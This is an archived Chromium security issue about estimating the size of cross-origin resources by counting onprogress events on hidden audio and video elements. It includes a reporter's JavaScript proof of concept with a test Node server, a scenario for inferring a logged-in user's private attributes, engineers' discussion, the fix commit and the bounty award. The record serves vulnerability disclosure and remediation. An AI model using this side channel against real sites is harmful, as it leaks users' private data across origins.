# Security: Cross Site Resource Size Estimation via OnProgress events

| Field | Value |
|-------|-------|
| **Issue ID** | [40090927](https://issues.chromium.org/issues/40090927) |
| **Status** | Accepted |
| **Severity** | S3-Low |
| **Priority** | P3 |
| **Component** | Blink>Media, Blink>SecurityFeature>SameOriginPolicy |
| **Reporter** | ro...@gmail.com |
| **Assignee** | hu...@chromium.org |
| **Created** | 2018-03-27 |
| **Bounty** | $500.00 |

## Description

**VULNERABILITY DETAILS**  

I was able to use the video/audio html5 tags to get a pretty good estimation of a cross origin resource size, since there is no validation on the resource content type it is possible to estimate any resource.  

I found that by engineering sites to return a diffrent response size depending on the currently logged user properties it is possible to use this method to extract valuable information.  

For example if a social networking site allow his users to create public posts to a specific audience, let's say only for people in the age of 24. an attacker can create multiple posts for each age; Then using hidden video tags he could request each resource; since using this method give us an estimation of the resource size it would be possible for an attacker to extract the currently logged social networking user site exact age in seconds.

**VERSION**  

Chrome Version: Version 65.0.3325.181 (Official Build) (64-bit)  

Operating System: macOS Sierra 10.12.6 (16G1114)

**REPRODUCTION CASE**

1. Run the http server using "node server.js"
2. Open the attached HTML in a browser.

---

HTML:  

I make a javascript function that return an estimation of a resource size, see "estimate\_cross\_origin\_resource"

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">
<title></title>
</head>
<body>
<script>
const estimate\_cross\_origin\_resource = (url) => {
```
        let counter = 0,  
            rand = 'random=' + new Date().getTime(),  
            separator = (url.indexOf('?') !== -1) ? '&' : '?'  
          
        url = url + separator + rand  
      
        return new Promise( resolve => {  
            const element = document.createElement('audio')  
            element.src = url  
            element.style = 'display:none'  
            element.preload = 'metadata'  
            element.onprogress = () => counter += 1  
            element.onerror = () => resolve(counter)  
            document.body.append(element)  
        })  
    }  
      
    for (let i = 100000; i<=300000; i+= 50000){  
        (size => {  
            estimate_cross_origin_resource(`http://localhost:3030/?size=${size}`).then( count => {  
                console.log('KB', Math.round(i/1024), 'Count', count)  
            })  
        })(i)  
    }  
</script>  

```
</body>
</html>

---

I made a basic node http server that return a response size by a given size parameter.

NODEJS CODE:

const http = require('http');  

const url = require('url');

http.createServer(function (request, response) {  

let {query} = url.parse(request.url, true)  

let output = ''

```
for (let i =0;i<parseInt(query.size); i++){  
    output += '0'  
}  
  
if (!query.delay){  
    response.end(output)  
}else{  
    setTimeout(() => {  
        response.end(output)  
    }, query.delay\*1000)  
}  

```

}).listen(3030)

## Attachments

- [Response Size Estimation.zip](attachments/Response Size Estimation.zip) (application/octet-stream, 2.3 KB)

## Timeline

### ro...@gmail.com (2018-03-27)

Please note that the resource estimation is done by counting the number of times the "onprogress" event was called. In the example I've attached you can see how the event is called diffrent amount of times depending on the loaded resource size. (See in development console)

### el...@chromium.org (2018-03-27)

So, this attack is predicated on 

1. the OnProgress event firing at intervals based on consistent block read sizes from the server and

2. Audio/video tags failing to reject responses with invalid MIME types.

Is that correct?

[Monorail components: Blink>Media Blink>SecurityFeature>SameOriginPolicy]

### ro...@gmail.com (2018-03-27)

Yes, this is correct.

### el...@chromium.org (2018-03-27)

I was able to reproduce this with a cross-origin application/octet-stream download. It's fairly "noisy" (a 900K file was often estimated at 400k) but it was easy to distinguish between two files with very different sizes (900k and 16k).

This is really only interesting for non-Audio/Video types, insofar as the control directly exposes the |.duration| of cross-origin media as a property measured in seconds.

### mm...@chromium.org (2018-03-28)

hubbe@, could you please take a look? I assumed that you might be a right owner as per https://chromium.googlesource.com/chromium/src/+/b2d3efd2ec18ffd52c3dacfece9862366b565a3d



### mm...@chromium.org (2018-03-28)

[Empty comment from Monorail migration]

### hu...@chromium.org (2018-03-28)

Not sure if I'm the right owner, but I'm not sure I'm the wrong owner either. :)

https://www.w3.org/TR/2011/WD-html5-20110113/Overview.html#event-media-progress
says:

"If a hostile page embeds victim content, the threat is that the embedding page could obtain information from the content that it would not otherwise have access to. The API does expose some information: the existence of the media, its type, its duration, its size, and the performance characteristics of its host. Such information is already potentially problematic, but in practice the same information can more or less be obtained using the img element, and so it has been deemed acceptable."

So maybe this is WAI?


### hu...@chromium.org (2018-03-28)

Maybe the right thing to do here is to make all non-playable media report exactly the same sequence of events as non-existing resources.


### da...@chromium.org (2018-03-28)

Also, does this work for non-audio/video? I'd expect we'd quickly error out without any useful amount of progress events fired in that case?

### el...@chromium.org (2018-03-28)

Re #9: My findings in #4 are that yes, this attack can result in an audio/video element leaking information about the size of a cross-origin octet-stream (to wit a Windows .exe file). 

I think /that/ attack ("Determine the byte length of an arbitrary response") is the only thing we're likely to be able to reasonably fix here (since e.g. determining a cross-origin video's duration is a leak that is reasonably the same as determining a cross-origin image's dimensions).

### da...@chromium.org (2018-03-28)

That's unexpected to me, sticking <video src="exe file"> I would expect fails pretty quickly and with a probe always around ~1mb.

https://cs.chromium.org/chromium/src/third_party/ffmpeg/libavformat/options_table.h?type=cs&q=format_probesize&l=40

Which probably means your 1kb vs 900kb test works, but everything > 1mb would land in the same bucket?

### ro...@gmail.com (2018-03-29)

Yes you are correct, over 1Mb i'm getting the same "onProgress Count", using the function I made in my example.

(However 1Mb is enough to perform the described attack, which is basically 
"making" a site reflect a user property (true false value) in a big or small response size.)

### hu...@chromium.org (2018-03-29)

I guess we would have to not fire any onprogress events before we decide if the content is media or not if we want to fix this.


### da...@chromium.org (2018-03-29)

Yeah, that was what I was thinking. +foolip,mlamouri on their thoughts for not emitting progress events until probably have_metadata.

### hu...@chromium.org (2018-04-03)

foolip, mlamouri, ping?


### ev...@google.com (2018-04-11)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-04-18)

hubbe: Uh oh! This issue still open and hasn't been updated in the last 14 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### fo...@chromium.org (2018-04-18)

#14, that sounds like quite a reasonable mitigation for this, if it's not a problem that media resources themselves can have their sizes estimated.

### el...@chromium.org (2018-04-18)

Re #18: Correct, media elements directly expose equivalent information (e.g. the Duration property) even for cross-origin resources, and it wouldn't be practical to block that. So we should limit our concern to non-Media response types. 

### ev...@google.com (2018-04-18)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-05-03)

hubbe: Uh oh! This issue still open and hasn't been updated in the last 29 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### bu...@chromium.org (2018-05-09)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/4504a474c069d07104237d0c03bfce7b29a42de6

commit 4504a474c069d07104237d0c03bfce7b29a42de6
Author: Fredrik Hubinette <hubbe@google.com>
Date: Wed May 09 20:56:54 2018

defeat cors attacks on audio/video tags

Neutralize error messages and fire no progress events
until media metadata has been loaded for media loaded
from cross-origin locations.

Bug: 828265, 826187
Change-Id: Iaf15ef38676403687d6a913cbdc84f2d70a6f5c6
Reviewed-on: https://chromium-review.googlesource.com/1015794
Reviewed-by: Mounir Lamouri <mlamouri@chromium.org>
Reviewed-by: Dale Curtis <dalecurtis@chromium.org>
Commit-Queue: Fredrik Hubinette <hubbe@chromium.org>
Cr-Commit-Position: refs/heads/master@{#557312}
[add] https://crrev.com/4504a474c069d07104237d0c03bfce7b29a42de6/third_party/WebKit/LayoutTests/http/tests/media/media-load-nonmedia-crossorigin.html
[modify] https://crrev.com/4504a474c069d07104237d0c03bfce7b29a42de6/third_party/blink/renderer/core/html/media/html_media_element.cc
[modify] https://crrev.com/4504a474c069d07104237d0c03bfce7b29a42de6/third_party/blink/renderer/core/html/media/html_media_element.h


### hu...@chromium.org (2018-05-15)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-05-16)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-05-21)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-05-29)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-06-04)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
*********************************

### aw...@chromium.org (2018-06-04)

Greetings ronmasas@! The Chrome VRP panel looked at this, and decided to track it as Low severity, but did reward $500.

Also, how would you like to be credited in our release notes?

### aw...@chromium.org (2018-06-04)

[Empty comment from Monorail migration]

### ro...@gmail.com (2018-06-06)

Hi,

I would like to be credited as Ron Masas (Imperva)

Thanks!
Ron

### aw...@google.com (2018-07-23)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-07-28)

[Empty comment from Monorail migration]

### ro...@gmail.com (2018-08-14)

Hi,

I have two questions ( Not sure if that's the right place for that, so, apologies in advance :-) )

1. Since the bug has been fixed, can I publicly disclose details about this issue? If not when will I be able to?
2. I have yet to receive the reward, who should I contact about that?

Thanks
Ron

### aw...@google.com (2018-08-14)

Hi ronmasas@ - thanks for the questions.  Yes, you may publicly disclose details about this (given the release it's fixed in has reached stable for a while). Would you like us to remove view restrictions on this bug now (it's due to happen automatically next week).

I'll follow up about payment over email.  Cheers!

### ro...@gmail.com (2018-08-14)

Hi, thank you for the response
Yes, please remove the view restrictions.

Thanks!
Ron

### aw...@chromium.org (2018-08-14)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-08-28)

[Empty comment from Monorail migration]

### aw...@chromium.org (2019-06-27)

[Empty comment from Monorail migration]

### is...@google.com (2019-06-27)

This issue was migrated from crbug.com/chromium/826187?no_tracker_redirect=1

[Multiple monorail components: Blink>Media, Blink>SecurityFeature>SameOriginPolicy]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40090927)*
